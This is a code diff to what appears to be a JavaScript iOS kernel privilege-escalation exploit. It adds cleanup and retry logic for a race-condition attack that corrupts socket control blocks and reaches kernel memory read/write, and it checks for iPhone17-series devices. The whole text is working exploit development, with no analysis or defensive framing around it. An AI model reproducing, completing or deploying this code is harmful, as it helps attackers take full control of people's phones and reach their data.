@@ -1137,11 +1137,13 @@
     return output_socket_port;
   }
   function sockets_release() {
-    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
+    while (socket_ports.length > 0) {
       let port = socket_ports.pop();
-      mach_port_deallocate(mach_task_self(), port);
-      socket_pcb_ids.pop();
+      if (port != undefined && port != 0n) {
+        try { mach_port_deallocate(mach_task_self(), port); } catch (_) {}
+      }
     }
+    socket_pcb_ids = [];
     socket_ports_count = 0n;
   }
   function create_surface_with_address(address, size) {
@@ -1168,9 +1170,107 @@
   }
   function surface_munlock(address, size) {
     if (mlock_dict[address] != undefined) {
-      CFRelease(mlock_dict[address]);
+      try { CFRelease(mlock_dict[address]); } catch (_) {}
     }
-    mlock_dict[address] = undefined;
+    delete mlock_dict[address];
+  }
+  function surface_munlock_all() {
+    for (let key of Object.keys(mlock_dict)) {
+      if (mlock_dict[key] != undefined && mlock_dict[key] != 0n) {
+        try { CFRelease(mlock_dict[key]); } catch (_) {}
+      }
+      delete mlock_dict[key];
+    }
+    mlock_dict = {};
+  }
+  function pe_preflight_cleanup() {
+    LOG("[PE-CLEAN] preflight cleanup before kernel stage");
+
+    if (free_thread_jsthread != 0n) {
+      try {
+        if (free_thread_start_ptr != 0n) uwrite64(free_thread_start_ptr, 1n);
+        if (go_sync_ptr != 0n) uwrite64(go_sync_ptr, 1n);
+        if (race_sync_ptr != 0n) uwrite64(race_sync_ptr, 1n);
+        usleep(10000n);
+        if (go_sync_ptr != 0n) uwrite64(go_sync_ptr, 0n);
+        if (race_sync_ptr != 0n) uwrite64(race_sync_ptr, 1n);
+        js_thread_join(free_thread_jsthread);
+      } catch (e) {
+        LOG("[PE-CLEAN] free thread cleanup failed: " + String(e));
+      }
+      free_thread_jsthread = 0n;
+    }
+
+    sockets_release();
+    surface_munlock_all();
+
+    if (pc_address != 0n && pc_size != 0n) {
+      try { mach_vm_deallocate(mach_task_self(), pc_address, pc_size); } catch (_) {}
+    }
+    pc_address = new_bigint();
+    pc_size = 0n;
+
+    if (pc_object != 0n) {
+      try { mach_port_deallocate(mach_task_self(), pc_object); } catch (_) {}
+    }
+    pc_object = new_bigint();
+
+    if (read_fd > 0n && read_fd != 0xFFFFFFFFFFFFFFFFn) {
+      try { close(read_fd); } catch (_) {}
+      read_fd = 0n;
+    }
+    if (write_fd > 0n && write_fd != 0xFFFFFFFFFFFFFFFFn) {
+      try { close(write_fd); } catch (_) {}
+      write_fd = 0n;
+    }
+    if (control_socket > 0n && control_socket != 0xFFFFFFFFFFFFFFFFn) {
+      try { close(control_socket); } catch (_) {}
+      control_socket = 0n;
+    }
+    if (rw_socket > 0n && rw_socket != 0xFFFFFFFFFFFFFFFFn) {
+      try { close(rw_socket); } catch (_) {}
+      rw_socket = 0n;
+    }
+
+    if (read_file_path != 0n) {
+      try { free(read_file_path); } catch (_) {}
+      read_file_path = 0n;
+    }
+    if (write_file_path != 0n) {
+      try { free(write_file_path); } catch (_) {}
+      write_file_path = 0n;
+    }
+    if (free_thread_arg != 0n) {
+      try { free(free_thread_arg); } catch (_) {}
+      free_thread_arg = 0n;
+    }
+    if (default_file_content != 0n) {
+      try { free(default_file_content); } catch (_) {}
+    }
+
+    random_marker = arc4random() << 32n | arc4random();
+    wired_page_marker = arc4random() << 32n | arc4random();
+    default_file_content = calloc(1n, target_file_size);
+    memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
+
+    highiest_success_idx = 0n;
+    success_read_count = 0n;
+    free_target = 0n;
+    free_target_size = 0n;
+    free_thread_start_ptr = 0n;
+    free_target_sync_ptr = 0n;
+    free_target_size_sync_ptr = 0n;
+    target_object_sync_ptr = 0n;
+    target_object_offset_sync_ptr = 0n;
+    go_sync_ptr = 0n;
+    race_sync_ptr = 0n;
+    control_socket_pcb = 0n;
+    rw_socket_pcb = 0n;
+    rw_socket_original_icmp6filter = 0n;
+    rw_socket_original_icmp6filter_next = 0n;
+    memset(control_data, 0n, EARLY_KRW_LENGTH);
+
+    LOG("[PE-CLEAN] preflight cleanup done");
   }
   function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
     if (do_read == true) {
@@ -1372,6 +1472,7 @@
       sockets_release();
       for (let s = 0n; s < n_of_search_mappings; s++) {
         let search_mapping_address = search_mappings.pop();
+        surface_munlock(search_mapping_address, search_mapping_size);
         kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       }
       if (is_a18_devices) {
@@ -1506,6 +1607,7 @@
         exit(0n);
       }
       sockets_release();
+      surface_munlock(search_mapping_address, search_mapping_size);
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
         break;
@@ -1515,9 +1617,11 @@
       let wired_page = wired_mapping_entries_addresses[i];
       mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
     }
+    surface_munlock_all();
   }
   function pe() {
     LOG("[PE-DBG] pe() entered");
+    pe_preflight_cleanup();
     let device_machine = get_device_machine();
     LOG("[PE-DBG] device_machine ptr: " + device_machine.hex());
     let a18_prefix_cmp = strncmp(device_machine, get_cstring("iPhone17,"), 9n);
